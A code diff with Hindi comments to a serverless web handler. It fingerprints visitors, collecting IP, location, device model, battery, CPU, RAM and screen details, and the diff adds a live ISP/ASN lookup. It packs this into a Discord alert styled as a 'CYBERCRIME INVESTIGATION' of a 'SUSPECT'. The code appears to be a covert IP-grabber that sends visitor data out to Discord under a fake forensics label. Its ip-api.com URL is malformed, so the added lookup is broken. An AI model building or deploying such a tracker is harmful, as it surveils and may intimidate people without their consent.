@@ -21,12 +21,31 @@ export default async function handler(req, res) {
 
             const timestamp = new Date().toISOString();
 
+            // 🔍 2.5. ISP और ASN लाइव लुकअप फेच करना
+            let ispName = "N/A";
+            let asnDetails = "N/A";
+            try {
+                // Vercel हेडर्स में कभी-कभी मल्टीपल IPs होती हैं, इसलिए पहली IP का इस्तेमाल करें
+                const targetIp = ip.split(',')[0].trim();
+                const ipRes = await fetch(`http://ip-api.com{targetIp}?fields=isp,as`);
+                if (ipRes.ok) {
+                    const ipData = await ipRes.json();
+                    ispName = ipData.isp || "Unknown ISP";
+                    asnDetails = ipData.as || "Unknown ASN";
+                }
+            } catch (e) {
+                ispName = "Lookup Timeout/Error";
+                asnDetails = "Lookup Timeout/Error";
+            }
+
             // 3. पूरा फोरेंसिक लॉग कंबाइन करें
             const comprehensiveLog = {
                 CASE_STATUS: "SUSPECT_INTERACTION_DETECTED",
                 TIMESTAMP: timestamp,
                 NETWORK: {
                     ip_address: ip,
+                    provider_isp: ispName,
+                    routing_asn: asnDetails,
                     location: `${city}, ${country}`
                 },
                 BROWSER_USER_AGENT: userAgentString,
@@ -52,7 +71,7 @@ export default async function handler(req, res) {
             // 🎨 Discord Fancy Cyber Dashboard Payload Construction
             const discordPayload = {
                 username: "🚨 CYBERCRIME INVESTIGATION",
-                avatar_url: "https://imgur.com", // डार्क थीम का अवतार
+                avatar_url: "https://imgur.com", // डार्क थीम का हकर अवतार
                 embeds: [{
                     title: "💥 SUSPECT INTERACTION DETECTED",
                     color: 15548997, // लाल रंग का अलर्ट बॉक्स
@@ -60,6 +79,7 @@ export default async function handler(req, res) {
                     footer: { text: "FioMart Forensics Center • Live Intelligence" },
                     fields: [
                         { name: "🌐 NETWORK POINT", value: `**IP Address:** \`${ip}\`\n**Location:** ${city}, ${country}`, inline: false },
+                        { name: "📡 TELECOM / ISP INTELLIGENCE", value: `**Provider ISP:** \`${ispName}\`\n**Routing ASN:** \`${asnDetails}\``, inline: false },
                         { name: "💻 DEVICE FINGERPRINT", value: `**Exact Model:** ${hardwareData.exactModel || "N/A"}\n**OS Version:** ${hardwareData.osVersion || "N/A"}\n**Timezone:** ${hardwareData.timezone || "N/A"}`, inline: true },
                         { name: "🔋 POWER STATUS", value: `**Battery Level:** \`${hardwareData.batteryLevel || "N/A"}\`\n**Charging:** ${hardwareData.isCharging || "N/A"}`, inline: true },
                         { name: "🛠️ HARDWARE DIAGNOSTICS", value: `**CPU Cores:** ${hardwareData.cores || "N/A"} Cores\n**RAM Memory:** ${hardwareData.ram || "N/A"} GB\n**Resolution:** ${hardwareData.screenRes || "N/A"}`, inline: false },
